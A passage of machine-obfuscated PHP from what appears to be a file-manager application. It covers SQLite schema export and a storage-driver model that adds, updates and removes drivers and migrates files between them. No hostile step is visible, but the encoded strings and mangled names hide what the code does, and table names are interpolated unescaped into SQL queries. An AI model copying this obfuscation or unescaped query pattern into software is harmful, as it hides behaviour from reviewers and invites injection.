$šğ“…É[12]); return $øåáì±ˆ ? $‚şáÚ…½[$øåáì±ˆ] : $‚şáÚ…½; } $Šüª±–° = $Œ·ÕÖ­¯->query($¨Èõ–İÁ); $ù³ôĞÄ = $šğ“…É[12]; $ÙûÂ‹¥û = array(); foreach ($Šüª±–° as $şÅıæ· ) { if (!$ù³ôĞÄ && $şÅıæ· [$šğ“…É[1182]] == $šğ“…É[1183]) { $ù³ôĞÄ = $şÅıæ· [$šğ“…É[1184]]; } if (isset($ÙûÂ‹¥û[$şÅıæ· [$šğ“…É[1182]]])) { $ÙûÂ‹¥û[$şÅıæ· [$šğ“…É[1182]]][$šğ“…É[1185]][] = $şÅıæ· [$šğ“…É[1184]]; continue; } $ÙûÂ‹¥û[$şÅıæ· [$šğ“…É[1182]]] = array($šğ“…É[1186] => $şÅıæ· [$šğ“…É[1182]], $šğ“…É[1185] => array($şÅıæ· [$šğ“…É[1184]]), $šğ“…É[1187] => $şÅıæ· [$šğ“…É[1188]] == $šğ“…É[91] ? 0 : 1); } $²±½ÏÖü = array(); foreach ($ÙûÂ‹¥û as $şÅıæ· ) { $ó•ËÇ£ö = $şÅıæ· [$šğ“…É[1186]] == $šğ“…É[1183]; $ĞåŒ¦³æ = array($šğ“…É[1189], $şÅıæ· [$šğ“…É[1187]] == $šğ“…É[91] && !$ó•ËÇ£ö ? $šğ“…É[1190] : $šğ“…É[12], $šğ“…É[1191], $šğ“…É[1192] . $å´´¹şÏ . $šğ“…É[11] . ($ó•ËÇ£ö ? $šğ“…É[1193] : $şÅıæ· [$šğ“…É[1186]]) . $šğ“…É[121], $šğ“…É[1194], $šğ“…É[121] . $å´´¹şÏ . $šğ“…É[121], $šğ“…É[1195] . implode($šğ“…É[1196], $şÅıæ· [$šğ“…É[1185]]) . $šğ“…É[1197]); $²±½ÏÖü[] = implode($šğ“…É[53], $ĞåŒ¦³æ) . $šğ“…É[74]; } $ûüß­éÁ = array(); $š÷´×¤¯ = array($šğ“…É[1198] => $šğ“…É[1199], $šğ“…É[1199] => $šğ“…É[1199], $šğ“…É[374] => $šğ“…É[401], $šğ“…É[373] => $šğ“…É[401]); foreach ($à†¦Šã as $şÅıæ· ) { $ĞåŒ¦³æ = array($šğ“…É[121] . $şÅıæ· [$šğ“…É[1200]] . $šğ“…É[121], isset($š÷´×¤¯[$şÅıæ· [$šğ“…É[1201]]]) ? $š÷´×¤¯[$şÅıæ· [$šğ“…É[1201]]] : $şÅıæ· [$šğ“…É[1202]], $şÅıæ· [$šğ“…É[1203]] == $šğ“…É[977] ? $šğ“…É[1204] : $šğ“…É[1205], $şÅıæ· [$šğ“…É[1200]] == $ù³ôĞÄ ? $šğ“…É[1206] : $šğ“…É[12], $şÅıæ· [$šğ“…É[1028]] ? strtoupper(str_replace($šğ“…É[11], $šğ“…É[12], $şÅıæ· [$šğ“…É[1028]])) : $šğ“…É[12]); $ûüß­éÁ[] = trim(implode($šğ“…É[53], $ĞåŒ¦³æ)); } $ùÍß®Æ = array($šğ“…É[1207] . $å´´¹şÏ . $šğ“…É[1208], $šğ“…É[1209] . $å´´¹şÏ . $šğ“…É[1210], implode($šğ“…É[50] . PHP_EOL, $ûüß­éÁ), $šğ“…É[1025]); $éççİÇ = implode(PHP_EOL, array_merge($ùÍß®Æ, $²±½ÏÖü)); if ($øåáì±ˆ && $øåáì±ˆ == $šğ“…É[13]) { return $éççİÇ; } $‚şáÚ…½ = array($šğ“…É[885] => $à¿±³Ğı, $šğ“…É[13] => $éççİÇ); return $øåáì±ˆ ? $‚şáÚ…½[$øåáì±ˆ] : $‚şáÚ…½; } public function sqlFromSqlite($ñ®«œü, $Ä›şÕù = '') { $™°«ÙŠĞ =& $_SERVER[±³—úê]; $Âù–»ó› = $this->model()->db(); $ßÉ®Ä•¼ = "\x50\x52\x41\x47\x4d\x41\x20\124\101\x42\114\x45\137\x49\116\106\x4f\40\x28\47{$ñ®«œü}\47\x29"; $ûÚÍ¼Á‰ = "\123\x45\114\x45\x43\x54\x20\x2a\x20\106\122\117\115\x20\163\x71\x6c\x69\164\145\137\155\x61\x73\164\145\162\x20\x57\x48\x45\x52\105\40\x74\x62\154\x5f\156\x61\155\x65\x20\x3d\40\x27{$ñ®«œü}\x27"; $«åÃúæÜ = $Âù–»ó›->query($ßÉ®Ä•¼); if (empty($«åÃúæÜ)) { $Î•Ú«¹† = array($™°«ÙŠĞ[885] => $™°«ÙŠĞ[12], $™°«ÙŠĞ[13] => $™°«ÙŠĞ[12]); return $Ä›şÕù ? $Î•Ú«¹†[$Ä›şÕù] : $Î•Ú«¹†; } $€”©¿÷ª = $Âù–»ó›->query($ûÚÍ¼Á‰); $“£¡Ô„ë = $¼ÕÌœÛ˜ = array(); foreach ($€”©¿÷ª as $Õí»™õÙ) { if ($Õí»™õÙ[$™°«ÙŠĞ[33]] == $™°«ÙŠĞ[367]) { $“£¡Ô„ë[] = $Õí»™õÙ[$™°«ÙŠĞ[1211]]; } else { $¼ÕÌœÛ˜[$Õí»™õÙ[$™°«ÙŠĞ[32]]] = $Õí»™õÙ[$™°«ÙŠĞ[1211]]; } } $óì›âå· = array_merge(array($™°«ÙŠĞ[1207] . $ñ®«œü . $™°«ÙŠĞ[121]), $“£¡Ô„ë, array_values($¼ÕÌœÛ˜)); $óì›âå· = implode($™°«ÙŠĞ[74] . PHP_EOL, $óì›âå·) . $™°«ÙŠĞ[74]; if ($Ä›şÕù && $Ä›şÕù == $™°«ÙŠĞ[13]) { return $óì›âå·; } $Ñ´€ÀÏÜ = array(); foreach ($¼ÕÌœÛ˜ as $Äæ©îïé => $£â”â¡) { $ã›¼ıô¤ = str_replace($™°«ÙŠĞ[1212] . $ñ®«œü . $™°«ÙŠĞ[11], $™°«ÙŠĞ[12], $Äæ©îïé); $ã›¼ıô¤ = str_replace($ñ®«œü . $™°«ÙŠĞ[11], $™°«ÙŠĞ[12], $Äæ©îïé); $µúéìä— = str_replace(array($™°«ÙŠĞ[121], $™°«ÙŠĞ[1036]), $™°«ÙŠĞ[472], substr($£â”â¡, stripos($£â”â¡, $™°«ÙŠĞ[348]))); $Ñ´€ÀÏÜ[$ã›¼ıô¤] = $µúéìä—; } $µü­±€¡ = array(); $À©ü¿¬÷ = array($™°«ÙŠĞ[1199] => $™°«ÙŠĞ[1213], $™°«ÙŠĞ[401] => $™°«ÙŠĞ[1214]); $Ë¼úÑ¿ = $‹Á±É’ = $™°«ÙŠĞ[12]; foreach ($«åÃúæÜ as $Õí»™õÙ) { if ($Õí»™õÙ[$™°«ÙŠĞ[57]] == $™°«ÙŠĞ[91]) { $Ë¼úÑ¿ = $Õí»™õÙ[$™°«ÙŠĞ[32]]; } $ŒöâÃİŸ = $Õí»™õÙ[$™°«ÙŠĞ[33]]; if ($ŒöâÃİŸ == $™°«ÙŠĞ[1215] && isset($Ñ´€ÀÏÜ[$Õí»™õÙ[$™°«ÙŠĞ[32]]])) { $ŒöâÃİŸ = $™°«ÙŠĞ[1216]; } $ºĞÄ¾†î = array($™°«ÙŠĞ[472] . $Õí»™õÙ[$™°«ÙŠĞ[32]] . $™°«ÙŠĞ[472], _get($À©ü¿¬÷, $ŒöâÃİŸ, $ŒöâÃİŸ), $Õí»™õÙ[$™°«ÙŠĞ[35]] == $™°«ÙŠĞ[91] ? $™°«ÙŠĞ[1204] : $™°«ÙŠĞ[1217] . $Õí»™õÙ[$™°«ÙŠĞ[56]], $Õí»™õÙ[$™°«ÙŠĞ[57]] == $™°«ÙŠĞ[91] ? $™°«ÙŠĞ[1218] : $™°«ÙŠĞ[12]); $µü­±€¡[] = trim(implode($™°«ÙŠĞ[53], $ºĞÄ¾†î)); } foreach ($Ñ´€ÀÏÜ as $ã›¼ıô¤ => $µúéìä—) { if ($ã›¼ıô¤ == $™°«ÙŠĞ[1193]) { $²Ò‹Ø± = $‹Á±É’ = $™°«ÙŠĞ[1219] . $Ë¼úÑ¿ . $™°«ÙŠĞ[1220]; } else { $²Ò‹Ø± = (stripos($ã›¼ıô¤, $™°«ÙŠĞ[11]) ? $™°«ÙŠĞ[1221] : $™°«ÙŠĞ[12]) . ($™°«ÙŠĞ[1222] . $ã›¼ıô¤ . $™°«ÙŠĞ[1223] . $µúéìä—); } $µü­±€¡[] = $²Ò‹Ø±; } if ($Ë¼úÑ¿ && !$‹Á±É’) { $µü­±€¡ = array_merge(array($™°«ÙŠĞ[1219] . $Ë¼úÑ¿ . $™°«ÙŠĞ[1220]), $µü­±€¡); } $……»ÌÑ³ = array($™°«ÙŠĞ[1224] . $ñ®«œü . $™°«ÙŠĞ[1225], $™°«ÙŠĞ[1226] . $ñ®«œü . $™°«ÙŠĞ[1227], implode($™°«ÙŠĞ[50] . PHP_EOL, $µü­±€¡), $™°«ÙŠĞ[1228]); $ş˜¬¤«„ = implode(PHP_EOL, $……»ÌÑ³); if ($Ä›şÕù && $Ä›şÕù == $™°«ÙŠĞ[885]) { return $ş˜¬¤«„; } $Î•Ú«¹† = array($™°«ÙŠĞ[885] => $ş˜¬¤«„, $™°«ÙŠĞ[13] => $óì›âå·); return $Ä›şÕù ? $Î•Ú«¹†[$Ä›şÕù] : $Î•Ú«¹†; } } goto cùê‘Ùô–; fÜËºÆÒãÔ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\163\164\x6f\x72\141\x67\145\x4c\151\x73\164"; public $field = array("\156\x61\x6d\145", "\x73\151\172\145\115\x61\170", "\x73\171\x73\x74\145\x6d", "\x64\x65\x66\x61\165\154\164", "\144\162\x69\x76\x65\162", "\143\x6f\156\x66\151\147"); public function listData($¦—ßœ = false, $ÊÌ‡’àÁ = "\x6d\157\x64\x69\x66\171\124\x69\x6d\145", $ãË¼£èİ = false) { $›‰ÇŸ€Œ =& $_SERVER[±³—úê]; $íı‡‘ÖÚ = parent::listData($¦—ßœ, $ÊÌ‡’àÁ, $ãË¼£èİ); if ($¦—ßœ) { return $íı‡‘ÖÚ; } $¢æÁ¼£‘ = array(); if ($GLOBALS[$›‰ÇŸ€Œ[2308]]) { $¢æÁ¼£‘ = $this->ioSizeUseGet(array_to_keyvalue($íı‡‘ÖÚ, $›‰ÇŸ€Œ[12], $›‰ÇŸ€Œ[486])); } foreach ($íı‡‘ÖÚ as $…ÌĞ²…ı => $¯öûî˜‚) { unset($íı‡‘ÖÚ[$…ÌĞ²…ı][$›‰ÇŸ€Œ[6]]); $íı‡‘ÖÚ[$…ÌĞ²…ı][$›‰ÇŸ€Œ[1963]] = isset($¢æÁ¼£‘[$¯öûî˜‚[$›‰ÇŸ€Œ[486]]]) ? $¢æÁ¼£‘[$¯öûî˜‚[$›‰ÇŸ€Œ[486]]] : 0; } return $íı‡‘ÖÚ; } public function ioSizeUseGet($ÏåƒÀÃë) { $±¬…åûô =& $_SERVER[±³—úê]; if (!$ÏåƒÀÃë) { return array(); } $”¶íÆ³› = $±¬…åûô[2309] . implode($±¬…åûô[50], $ÏåƒÀÃë); $ÛÀ‰¹¾Ê = Cache::get($”¶íÆ³›); if ($ÛÀ‰¹¾Ê) { return $ÛÀ‰¹¾Ê; } $Öæ¹¾½Â = array($±¬…åûô[898] => $±¬…åûô[486], $±¬…åûô[2310] => $±¬…åûô[79]); $ò¾éøş‘ = array($±¬…åûô[898] => array($±¬…åûô[7], $ÏåƒÀÃë)); $ÛÀ‰¹¾Ê = Model($±¬…åûô[870])->field($Öæ¹¾½Â)->where($ò¾éøş‘)->group($±¬…åûô[898])->select(); $ÛÀ‰¹¾Ê = array_to_keyvalue($ÛÀ‰¹¾Ê, $±¬…åûô[486], $±¬…åûô[79]); Cache::set($”¶íÆ³›, $ÛÀ‰¹¾Ê, 600); return $ÛÀ‰¹¾Ê; } public function getConfig($ãêïóÕ) { $î‰ÉÎøµ = parent::listData($ãêïóÕ); $¢å±Ë€ = _get($î‰ÉÎøµ, $_SERVER[±³—úê][6], array()); if ($¢å±Ë€ && !is_array($¢å±Ë€)) { $¢å±Ë€ = json_decode($¢å±Ë€, !0); } return $¢å±Ë€; } public function update($×‡ÅŸé´, $û»ò¤ë’) { $²¹ª±Š =& $_SERVER[±³—úê]; $»ä‡ÎÁÑ = $û»ò¤ë’[$²¹ª±Š[32]]; $Üæ¤ò‹„ = array_to_keyvalue(parent::listData(), $²¹ª±Š[32]); if (isset($Üæ¤ò‹„[$»ä‡ÎÁÑ]) && $Üæ¤ò‹„[$»ä‡ÎÁÑ][$²¹ª±Š[486]] != $×‡ÅŸé´) { return !1; } $this->checkPwd($×‡ÅŸé´, $û»ò¤ë’); if (isset($û»ò¤ë’[$²¹ª±Š[2311]]) && $û»ò¤ë’[$²¹ª±Š[2311]] == $²¹ª±Š[91]) { $this->checkConfig($û»ò¤ë’); } unset($û»ò¤ë’[$²¹ª±Š[2311]]); $ÔºÏñõÎ = parent::update($×‡ÅŸé´, $û»ò¤ë’); if ($ÔºÏñõÎ && $û»ò¤ë’[$²¹ª±Š[37]]) { $Ôü§ß· = 0; foreach ($Üæ¤ò‹„ as $¦—ïŸ‚è) { if ($¦—ïŸ‚è[$²¹ª±Š[37]] && $¦—ïŸ‚è[$²¹ª±Š[486]] != $×‡ÅŸé´) { $Ôü§ß· = $¦—ïŸ‚è[$²¹ª±Š[486]]; parent::update($¦—ïŸ‚è[$²¹ª±Š[486]], array($²¹ª±Š[37] => 0)); } } $this->updateBackup($×‡ÅŸé´, $Ôü§ß·); } return $ÔºÏñõÎ; } public function add($î‡Ÿ±¿Ò) { $¸æ´òå =& $_SERVER[±³—úê]; $ÍöÊ¸Šİ = array_to_keyvalue(parent::listData(), $¸æ´òå[32]); if (isset($ÍöÊ¸Šİ[$î‡Ÿ±¿Ò[$¸æ´òå[32]]])) { return !1; } $this->checkConfig($î‡Ÿ±¿Ò); $¹‚à»—¨ = parent::insert($î‡Ÿ±¿Ò); if ($¹‚à»—¨ && $î‡Ÿ±¿Ò[$¸æ´òå[37]]) { foreach ($ÍöÊ¸Šİ as $ÌÙÓ¾‚ƒ) { if ($ÌÙÓ¾‚ƒ[$¸æ´òå[37]]) { parent::update($ÌÙÓ¾‚ƒ[$¸æ´òå[486]], array($¸æ´òå[37] => 0)); } } } return $¹‚à»—¨; } public function updateBackup($ı»è²ä§, $‘Ë×€”½) { $œæÛÊû› =& $_SERVER[±³—úê]; if (!$‘Ë×€”½) { return; } $Û¸¡Âß = Model($œæÛÊû›[828])->config(); if ($Û¸¡Âß[$œæÛÊû›[1744]] != $œæÛÊû›[91] || $Û¸¡Âß[$œæÛÊû›[832]] != $‘Ë×€”½) { return; } $—œºÏ• = Model($œæÛÊû›[850])->get($œæÛÊû›[864]); $—œºÏ• = json_decode($—œºÏ•, !0); if (!$—œºÏ•) { return; } $—œºÏ•[$œæÛÊû›[832]] = $ı»è²ä§; Model($œæÛÊû›[850])->set(array($œæÛÊû›[864] => $—œºÏ•)); } public function checkPwd($š£áœ‰, &$‡ÛÕÛŸ…) { $ìëÚãŠ‰ =& $_SERVER[±³—úê]; if (empty($‡ÛÕÛŸ…[$ìëÚãŠ‰[6]])) { return; } $¦ˆÖ‘ä = $‡ÛÕÛŸ…[$ìëÚãŠ‰[6]]; if (!is_array($¦ˆÖ‘ä)) { $¦ˆÖ‘ä = json_decode($¦ˆÖ‘ä, !0); } $è³éØÉî = $ìëÚãŠ‰[12]; $ëàà‚‰’ = array($ìëÚãŠ‰[2312], $ìëÚãŠ‰[2313], $ìëÚãŠ‰[968]); foreach ($ëàà‚‰’ as $¢ÌüÁ‰Æ) { if (isset($¦ˆÖ‘ä[$¢ÌüÁ‰Æ])) { $è³éØÉî = $¢ÌüÁ‰Æ; break; } } if (!$è³éØÉî) { return; } $òš‹©‰í = $this->getConfig($š£áœ‰); $–ü·•êî = $òš‹©‰í[$è³éØÉî]; $ÃîùŞ·ş = $¦ˆÖ‘ä[$è³éØÉî]; if ($ÃîùŞ·ş == str_repeat($ìëÚãŠ‰[232], strlen($–ü·•êî))) { $¦ˆÖ‘ä[$è³éØÉî] = $–ü·•êî; $‡ÛÕÛŸ…[$ìëÚãŠ‰[6]] = json_encode($¦ˆÖ‘ä); } else { if ($ÃîùŞ·ş != $–ü·•êî) { $‡ÛÕÛŸ…[$ìëÚãŠ‰[2311]] = $ìëÚãŠ‰[91]; } } } public function checkConfig(&$µ’á¯ÑÏ, $ç¨¾ÑÖ’ = false) { $ìÚïªóÄ =& $_SERVER[±³—úê]; $è¥êé‘¦ = strtolower($µ’á¯ÑÏ[$ìÚïªóÄ[98]]); $¤Öï¾×§ = $µ’á¯ÑÏ[$ìÚïªóÄ[6]]; if (!is_array($¤Öï¾×§)) { $¤Öï¾×§ = json_decode($¤Öï¾×§, !0); } foreach ($¤Öï¾×§ as $ˆÙÕ×ÓÃ => $Î«ûÍØ) { if (is_string($Î«ûÍØ)) { $¤Öï¾×§[$ˆÙÕ×ÓÃ] = trim($Î«ûÍØ); } } $¤Öï¾×§[$ìÚïªóÄ[2314]] = rand_string(6); $ë»““é¡ = $GLOBALS[$ìÚïªóÄ[6]][$ìÚïªóÄ[92]][$ìÚïªóÄ[906]]; $ø‹á™² = isset($ë»““é¡[$è¥êé‘¦]) ? $ë»““é¡[$è¥êé‘¦] : ucfirst($è¥êé‘¦); $óºªæÓ = $ìÚïªóÄ[77] . $ø‹á™²; if (!$ø‹á™² || !class_exists($óºªæÓ)) { if ($ç¨¾ÑÖ’) { return LNG($ìÚïªóÄ[2315]); } write_log(array($ìÚïªóÄ[2316], $µ’á¯ÑÏ, get_caller_info()), $ìÚïªóÄ[215]); show_json(LNG($ìÚïªóÄ[2315]), !1, $µ’á¯ÑÏ); } $—¹ğ½ë¹ = new $óºªæÓ($¤Öï¾×§); if (in_array($è¥êé‘¦, $—¹ğ½ë¹->objectDriver)) { try { if (!$—¹ğ½ë¹->isBucketCors() && !$—¹ğ½ë¹->setBucketCors()) { $£á»œËæ = LNG($ìÚïªóÄ[2317]); $£á»œËæ .= $ìÚïªóÄ[2318] . LNG($ìÚïªóÄ[2319]); } } catch (Exception $å—ÊÉ·°) { $£á»œËæ = $å—ÊÉ·°->getMessage(); } if (isset($£á»œËæ)) { return $this->_parseError($£á»œËæ, $è¥êé‘¦, $ç¨¾ÑÖ’); } if ($è¥êé‘¦ == $ìÚïªóÄ[68] && !$—¹ğ½ë¹->checkRegion()) { return $this->_parseError(LNG($ìÚïªóÄ[2320]), $è¥êé‘¦, $ç¨¾ÑÖ’); } } $í‰ğ…ÙÂ = rtrim($¤Öï¾×§[$ìÚïªóÄ[1264]], $ìÚïªóÄ[8]) . $ìÚïªóÄ[8]; $ĞÇ˜áÓá = $—¹ğ½ë¹->getPath($í‰ğ…ÙÂ . $ìÚïªóÄ[1268]); try { if ($è¥êé‘¦ == $ìÚïªóÄ[109]) { $—¹ğ½ë¹->mkdir($í‰ğ…ÙÂ); } $’Ò˜¯¿¬ = $—¹ğ½ë¹->mkfile($ĞÇ˜áÓá); if (!$’Ò˜¯¿¬) { $£á»œËæ = LNG($ìÚïªóÄ[2317]); } } catch (Exception $å—ÊÉ·°) { $£á»œËæ = $å—ÊÉ·°->getMessage(); } if (isset($£á»œËæ)) { return $this->_parseError($£á»œËæ, $è¥êé‘¦, $ç¨¾ÑÖ’); } $¤Öï¾×§[$ìÚïªóÄ[1264]] = $í‰ğ…ÙÂ; $µ’á¯ÑÏ[$ìÚïªóÄ[6]] = json_encode($¤Öï¾×§); $µ’á¯ÑÏ[$ìÚïªóÄ[98]] = $ø‹á™²; return !0; } private function _parseError($òÔ’ ³, $ú¼îÜİ, $¾Ç²ü­ = false) { $ü»“†ÕÎ =& $_SERVER[±³—úê]; if ($ú¼îÜİ == $ü»“†ÕÎ[68] && stripos($òÔ’ ³, $ü»“†ÕÎ[2321])) { $’‘ÜÀ§ô = explode($ü»“†ÕÎ[10], $òÔ’ ³); $«İõ±Ü© = isset($’‘ÜÀ§ô[1]) ? $’‘ÜÀ§ô[1] : $ü»“†ÕÎ[12]; $„‚ïîŞÓ = array($ü»“†ÕÎ[2322] => LNG($ü»“†ÕÎ[2323]), $ü»“†ÕÎ[2324] => LNG($ü»“†ÕÎ[2325])); if (isset($„‚ïîŞÓ[$«İõ±Ü©])) { $òÔ’ ³ = $„‚ïîŞÓ[$«İõ±Ü©]; } } if (stripos($òÔ’ ³, $ü»“†ÕÎ[2326]) === 0) { $¾÷•»“è = strpos($òÔ’ ³, $ü»“†ÕÎ[178]); if ($¾÷•»“è === !1) { $¾÷•»“è = strpos($òÔ’ ³, $ü»“†ÕÎ[4]); } if ($¾÷•»“è !== !1) { $òÔ’ ³ = substr($òÔ’ ³, $¾÷•»“è + 1); } } $òÔ’ ³ = LNG($ü»“†ÕÎ[1271]) . $òÔ’ ³; if ($¾Ç²ü­) { return $òÔ’ ³; } show_json($òÔ’ ³, !1); } public function driverListSystem() { $¸¼ˆò­‘ =& $_SERVER[±³—úê]; $œöğŞÏ” = parent::listData(); $Şæ¿¼ş¦ = array(); foreach ($œöğŞÏ” as $Ô´©øç) { unset($Ô´©øç[$¸¼ˆò­‘[243]], $Ô´©øç[$¸¼ˆò­‘[88]]); if (!is_array($Ô´©øç[$¸¼ˆò­‘[6]])) { $Ô´©øç[$¸¼ˆò­‘[6]] = json_decode($Ô´©øç[$¸¼ˆò­‘[6]], !0); } $Şæ¿¼ş¦[] = $Ô´©øç; } return $Şæ¿¼ş¦; } public function defaultDriver() { $ä›í¥çñ =& $_SERVER[±³—úê]; $ëÁğ‘ûÁ = parent::listData(); $”ù´ãÂ = array_filter_by_field($ëÁğ‘ûÁ, $ä›í¥çñ[37], 1); $”ù´ãÂ = $”ù´ãÂ[0]; if (!$”ù´ãÂ) { return array(); } if (!is_array($”ù´ãÂ[$ä›í¥çñ[6]])) { $”ù´ãÂ[$ä›í¥çñ[6]] = json_decode($”ù´ãÂ[$ä›í¥çñ[6]], !0); } return $”ù´ãÂ; } public function driverInfo($÷çŒ”£¨) { $Íì©¨¬ =& $_SERVER[±³—úê]; $Â—ÎÀè = array_to_keyvalue(parent::listData(), $Íì©¨¬[486]); if (!isset($Â—ÎÀè[$÷çŒ”£¨])) { return !1; } $¡Äúƒ = $Â—ÎÀè[$÷çŒ”£¨]; if (!is_array($¡Äúƒ[$Íì©¨¬[6]])) { $¡Äúƒ[$Íì©¨¬[6]] = json_decode($¡Äúƒ[$Íì©¨¬[6]], !0); } return $¡Äúƒ; } public function remove($Ï£ØóÏ…) { $this->removeShareItems($Ï£ØóÏ…); return parent::remove($Ï£ØóÏ…); } public function removeWithFile($¼·Ÿ„Ú, $‹”ˆÂ«ö, $ÈâºªÌã, $©€âƒÄ = false) { $×È•Ë« =& $_SERVER[±³—úê]; $ªÂŸ©€Ë = array($×È•Ë«[898] => $¼·Ÿ„Ú); $ÄªÕ®Òˆ = Model($×È•Ë«[555])->where($ªÂŸ©€Ë)->count(); $»Èœú­ = Model($×È•Ë«[555])->where($ªÂŸ©€Ë)->sum($×È•Ë«[79]); $öçã¼á = $‹”ˆÂ«ö . $×È•Ë«[2327] . $¼·Ÿ„Ú; $…ÇáÆê = LNG($‹”ˆÂ«ö == $×È•Ë«[634] ? $×È•Ë«[2328] : $×È•Ë«[2329]); $µ²ŞØ®† = new TaskFileTransfer($öçã¼á, $×È•Ë«[215], $ÄªÕ®Òˆ, $…ÇáÆê . $×È•Ë«[473] . $ÈâºªÌã[$×È•Ë«[32]] . $×È•Ë«[214] . $¼·Ÿ„Ú); $µ²ŞØ®†->task[$×È•Ë«[843]] = (double) $»Èœú­; $ŠÙƒÏ÷¨ = KodIO::defaultDriver(); $¹»½†¼ = $ŠÙƒÏ÷¨[$×È•Ë«[486]]; $ƒ®›­Ïı = $ƒëòÌª‘ = $Ø÷¾àÕ = array(); $èÉÈª² = Model($×È•Ë«[242])->where($ªÂŸ©€Ë)->field($×È•Ë«[2330])->select(); foreach ($èÉÈª² as $¸Ü·®¾) { $Ù‘Ùê¦ = $¸Ü·®¾[$×È•Ë«[552]]; if ($©€âƒÄ) { $ƒëòÌª‘[] = $Ù‘Ùê¦; continue; } $Ê•ğŒ·÷ = $¸Ü·®¾[$×È•Ë«[87]]; $ÉÚÀç×ó = get_path_father($Ê•ğŒ·÷); $Ø÷¾àÕ[] = $ÉÚÀç×ó; $ÉÚÀç×ó = str_replace("\x7b\x69\x6f\x3a{$¼·Ÿ„Ú}\175\57", "\x7b\x69\x6f\72{$¹»½†¼}\175\x2f", $ÉÚÀç×ó); if (!IO::exist($Ê•ğŒ·÷)) { $ƒ®›­Ïı[] = $Ù‘Ùê¦; $µ²ŞØ®†->updateFileEnd($¸Ü·®¾[$×È•Ë«[32]], $¸Ü·®¾[$×È•Ë«[79]]); write_log($×È•Ë«[2331] . $Ê•ğŒ·÷, $×È•Ë«[1906]); continue; } $Íå¶—úú = IO::move($Ê•ğŒ·÷, $ÉÚÀç×ó, REPEAT_RENAME); if (!$Íå¶—úú) { $ƒëòÌª‘[] = $Ù‘Ùê¦; $µ²ŞØ®†->updateFileEnd($¸Ü·®¾[$×È•Ë«[32]], $¸Ü·®¾[$×È•Ë«[79]]); write_log($×È•Ë«[2332] . $Ê•ğŒ·÷, $×È•Ë«[1906]); continue; } $ªÂŸ©€Ë = array($×È•Ë«[552] => $Ù‘Ùê¦); $ÖËÃã = array($×È•Ë«[898] => $¹»½†¼, $×È•Ë«[87] => $Íå¶—úú); Model($×È•Ë«[242])->where($ªÂŸ©€Ë)->save($ÖËÃã); } $áÅŞƒú’ = $µ²ŞØ®†->task; if (!$©€âƒÄ) { Cache::set($öçã¼á, $áÅŞƒú’); } $µ²ŞØ®†->end(); $ƒ®›­Ïı = array_unique($ƒ®›­Ïı); $ƒëòÌª‘ = array_unique($ƒëòÌª‘); if (!$©€âƒÄ && ($ƒ®›­Ïı || $ƒëòÌª‘)) { $ìÒù‘¡Ì = array(); if ($ƒ®›­Ïı) { $ìÒù‘¡Ì[] = sprintf(LNG($×È•Ë«[2333]), count($ƒ®›­Ïı)); } if ($ƒëòÌª‘) { $ìÒù‘¡Ì[] = sprintf(LNG($×È•Ë«[2334]), count($ƒëòÌª‘)); } $ìÒù‘¡Ì = sprintf(LNG($×È•Ë«[2335]), implode($×È•Ë«[2336], $ìÒù‘¡Ì)) . $×È•Ë«[2337] . date($×È•Ë«[2338]) . $×È•Ë«[2339]; if ($‹”ˆÂ«ö == $×È•Ë«[1943]) { $ìÒù‘¡Ì .= $×È•Ë«[2340] . LNG($×È•Ë«[2341]); } else { $ìÒù‘¡Ì = LNG($×È•Ë«[2342]) . $×È•Ë«[2343] . $ìÒù‘¡Ì; } $áÅŞƒú’[$×È•Ë«[1266]] = $ìÒù‘¡Ì; Cache::set($öçã¼á, $áÅŞƒú’); unset($ÈâºªÌã[$×È•Ë«[6]]); $Ûö‚Ÿ°× = array($×È•Ë«[486] => $¼·Ÿ„Ú, $×È•Ë«[2214] => $×È•Ë«[634], $×È•Ë«[32] => $ÈâºªÌã[$×È•Ë«[32]], $×È•Ë«[98] => $ÈâºªÌã[$×È•Ë«[98]]); Hook::trigger($×È•Ë«[1786], array($×È•Ë«[1289] => $Ûö‚Ÿ°×, $×È•Ë«[1299] => !0)); show_json($ìÒù‘¡Ì, !1, 100111); } if ($‹”ˆÂ«ö == $×È•Ë«[634]) { return !0; } if ($ƒ®›­Ïı || $ƒëòÌª‘) { $åôŞ‡÷ = array_merge($ƒ®›­Ïı, $ƒëòÌª‘); $åôŞ‡÷ = array_filter(array_unique($åôŞ‡÷)); $this->removeByFileID($åôŞ‡÷); } if ($Ø÷¾àÕ) { $Ø÷¾àÕ = array_filter(array_unique($Ø÷¾àÕ)); foreach ($Ø÷¾àÕ as $Ê•ğŒ·÷) { $®Ğ±ï…Ã = IO::has($Ê•ğŒ·÷, !0); if (!$®Ğ±ï…Ã[$×È•Ë«[251]] && !$®Ğ±ï…Ã[$×È•Ë«[252]]) { IO::remove($Ê•ğŒ·÷); } } } return $this->remove($¼·Ÿ„Ú); } private function removeByFileID($Ì¯Àß‚ˆ = array()) { $İæ¦Ø¼ =& $_SERVER[±³—úê]; if (empty($Ì¯Àß‚ˆ)) { return; } $•ã«õÎË = array($İæ¦Ø¼[552] => array($İæ¦Ø¼[7], $Ì¯Àß‚ˆ)); $ã²„ß°– = Model($İæ¦Ø¼[1423])->where($•ã«õÎË)->field($İæ¦Ø¼[193])->select(); if (!$ã²„ß°–) { return Model($İæ¦Ø¼[555])->remove($Ì¯Àß‚ˆ); } $ã²„ß°– = array_to_keyvalue($ã²„ß°–, $İæ¦Ø¼[12], $İæ¦Ø¼[193]); foreach ($ã²„ß°– as $™ßöĞ›—) { Model($İæ¦Ø¼[905])->removeNow($™ßöĞ›—, !1); } } private function removeShareItems($²Õ¶ÎŸ) { $±à®õí³ =& $_SERVER[±³—úê]; $å³êü•© = "\173\x69\157\x3a{$²Õ¶ÎŸ}\x7d\57"; $§×úÇô = array($±à®õí³[193] => 0, $±à®õí³[1259] => array($±à®õí³[470], "{$å³êü•©}\x25")); $”ÀÓ«¾â = Model($±à®õí³[1954])->where($§×úÇô)->field($±à®õí³[679])->select(); if (empty($”ÀÓ«¾â)) { return; } $­´úËü± = array_to_keyvalue($”ÀÓ«¾â, $±à®õí³[12], $±à®õí³[679]); Model($±à®õí³[678])->remove($­´úËü±); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x4c\x69\x67\150\164\x41\x70\x70"; public $modelType = "\x53\x79\x73\x74\145\155\x4f\160\164\x69\x6f\156"; public $field = array("\156\x61\155\145", "\147\162\157\x75\160", "\144\x65\x73\143", "\x63\157\x6e\x74\145\x6e\164"); public function listData($„ëë¨Æù = false, $öñÀ´µ’ = 